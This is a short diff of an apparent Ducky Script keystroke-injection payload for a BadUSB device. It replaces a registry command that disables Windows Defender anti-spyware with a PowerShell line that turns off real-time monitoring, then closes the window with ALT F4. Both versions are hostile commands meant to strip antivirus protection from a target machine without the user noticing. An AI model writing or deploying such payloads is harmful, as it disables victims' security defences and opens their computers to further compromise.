@@ -11,7 +11,7 @@ DELAY 215
 LEFTARROW
 ENTER
 DELAY 225
-STRING reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 200
 ALT F4
